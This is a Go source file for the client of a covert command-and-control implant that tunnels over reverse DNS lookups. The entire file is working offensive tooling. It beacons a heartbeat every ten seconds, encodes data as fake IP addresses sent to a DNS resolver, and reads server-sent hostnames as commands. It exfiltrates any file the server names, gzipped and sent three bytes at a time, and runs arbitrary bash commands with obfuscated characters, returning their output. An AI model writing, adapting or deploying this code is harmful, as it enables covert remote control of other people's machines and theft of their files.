package main

import (
	"bufio"
	"compress/gzip"
	"context"
	"fmt"
	"io"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"
)

func resolveCommand(host []string, bl *int) {
	// Change the mappings here to customize what triggers will be responsible for different operations. Ex: "cmd": "mail"
	trigger_mappings := map[string]string{"cmd": "cmd", "exf": "exf", "bash": "bash", "single": "single", "path": "path"}

	// If the host contains the string "cmd", we know that the server is sending the client a command to execute.
	if strings.Contains(host[0], trigger_mappings["cmd"]) {
		// Determine if the client is looking for a file name or a file at a specific path

		sections := strings.Split(host[0], ".")

		// Action type (exfil, bash command, etc.)
		action_type := strings.Split(sections[0], "-")[1]

		switch action_type {

		// Exfiltration command has been received
		case trigger_mappings["exf"]:
			// Destination type (filename or filepath; "single" or "path")
			dest_type := strings.Split(sections[0], "-")[2]

			args := sections[1:]
			filepath := strings.Join(args, ".")
			filepath = strings.Replace(filepath, "-", "/", -1)
			filepath = filepath[:len(filepath)-1]
			if dest_type == "path" {
				filepath = fmt.Sprintf("/%v", filepath)
			}

			// Perform the usual exfil operation as you would otherwise
			dat := setup_exfil(filepath)
			var mode string = "exfil"
			begin_comm(&dat, bl, &mode)

		// List directory command has been received
		case trigger_mappings["bash"]:
			replacement_mappings := map[string]string{"80": "..", "79": ".", "78": "|", "77": ";", "76": "'", "75": ">", "74": "/"}
			// https://www.sohamkamani.com/golang/exec-shell-command/
			var mode string = "c2"
			command := strings.Split(sections[0], "-")[2]
			bash_command := command
			if len(sections[1:]) > 1 {
				args := sections[1:]
				bash_command = strings.Join(args, "")
				indiv_args := strings.Split(bash_command, "-")
				bash_command = strings.Join(indiv_args, " ")

				for k, v := range replacement_mappings {
					if strings.Contains(bash_command, k) {
						bash_command = strings.Replace(bash_command, k, v, -1)
					}
				}
				bash_command = fmt.Sprintf("%v %v", command, bash_command)

			}
			cmd := exec.Command("/bin/bash", "-c", bash_command)
			out, err := cmd.Output()
			if err != nil {
				fmt.Println(err)
			}
			output_bytes := append([]byte("/b/"), out...)
			begin_comm(&output_bytes, bl, &mode)
			output_bytes = []byte("/f/")
			begin_comm(&output_bytes, bl, &mode)
		}
	}
}

// We will send the encoded data, and inspect the received hostname to see if the server wants the client to perform any actions. All strings used as triggers here can be replaced.
func resolveAddr(address string, bl *int) {
	// Specify your server address and port that will receive and decode the encoded data
	r := &net.Resolver{
		PreferGo: true,
		Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
			d := net.Dialer{
				Timeout: time.Millisecond * 1000,
			}
			return d.DialContext(ctx, network, "127.0.0.1:8053")
		},
	}
	host, _ := r.LookupAddr(context.Background(), address)
	if len(host) > 0 {
		resolveCommand(host, bl)
	}

}

func send_data(set_baseline bool, octets []byte, bl *int, mode ...*string) {
	// Create an empty variable in which to hold the entire address
	var constructed string

	// If sending baseline, set the first octet to "172" (pre-defined baseline signifier), fill the next two octets with random values, and store the baseline in the last octet.
	if set_baseline {

		// Distinguish between "exfil" and "c2" modes
		switch *mode[0] {
		case "exfil":
			octets = append(octets, byte(172))
		case "c2":
			octets = append(octets, byte(185))
		}
		// Set a baseline between 30 to 100
		*bl = rand.Intn(100-30) + 30

		octets = append(octets, byte(rand.Intn(255)), byte(rand.Intn(255)), byte(*bl))

		// Create the address
		constructed = fmt.Sprintf("%v.%v.%v.%v", octets[0], octets[1], octets[2], octets[3])

	} else {
		// Create an empty beginning octet
		var beginning_octet string

		// For each byte of data, check if the integer representation of the byte added to the baseline will go above 255; if so, Go will wrap the value back around to 0 using mod 256. If this will occur, set the
		// digit in the octet at the corresponding index of the wrapped octet to 2, and otherwise to 1. In doing this, we create the 'key' that will be used to determine whether we have to wrap the value back when
		// decoding the received address.
		for i := 0; i < len(octets); i++ {
			// If the value will be wrapped around, set a 2.
			if uint16(octets[i])+uint16(*bl) > 255 {
				beginning_octet += "2"
			} else { // Otherwise, set a 1.
				beginning_octet += "1"
			}

			// Add the baseline to the byte value
			octets[i] = octets[i] + byte(*bl)

			// Create the address
			constructed = fmt.Sprintf("%v.%v.%v.%v", beginning_octet, octets[0], octets[1], octets[2])
		}
	}
	resolveAddr(constructed, bl)
}

// Returns an array of bytes that are the compressed data of the file being exfiltrated.
func setup_exfil(file_path string) []byte {
	// https://www.educative.io/answers/how-to-compress-a-file-in-golang

	// Open the target file and read the data.
	file, err := os.Open(file_path)
	reader := bufio.NewReader(file)
	data, err := io.ReadAll(reader)

	// Create the target compression file and write the data into it.
	file, err = os.Create("compressed.gz")
	if err != nil {
		panic(err)
	}
	w := gzip.NewWriter(file)
	w.Write(data)
	w.Close()

	// Open the compressed data and read the data.
	dat, err := os.ReadFile("compressed.gz")
	if err != nil {
		panic(err)
	}

	err = os.Remove("compressed.gz")
	if err != nil {
		panic(err)
	}
	return dat
}

func add_padding(dat *[]byte) {
	// Pad the data with 0's such that the number of bytes of data is divisible by 3.
	for i := 0; i < (len(*dat) % 3); i++ {
		*dat = append((*dat), 0)
	}
}

func begin_comm(dat *[]byte, bp *int, mode *string) {
	// Set the baseline for the exchange; the list of bytes can be blank for this operation.
	send_data(true, []byte{}, bp, mode)
	add_padding(dat)

	// For each three bytes, send them to be sent encoded into an 'IP address'.
	var prior int = 0
	for index := 0; index < len(*dat); index++ {
		if (index != 0) && (index%3 == 0) {
			send_data(false, (*dat)[prior:index], bp)
			prior = index
		}
	}
	send_data(false, (*dat)[prior:], bp)
}

func main() {
	var baseline int
	var mode string = "c2"
	var command string = "hbt"
	for {
		command_bytes := []byte(command)
		begin_comm(&command_bytes, &baseline, &mode)
		time.Sleep(10000 * time.Millisecond)
	}
}
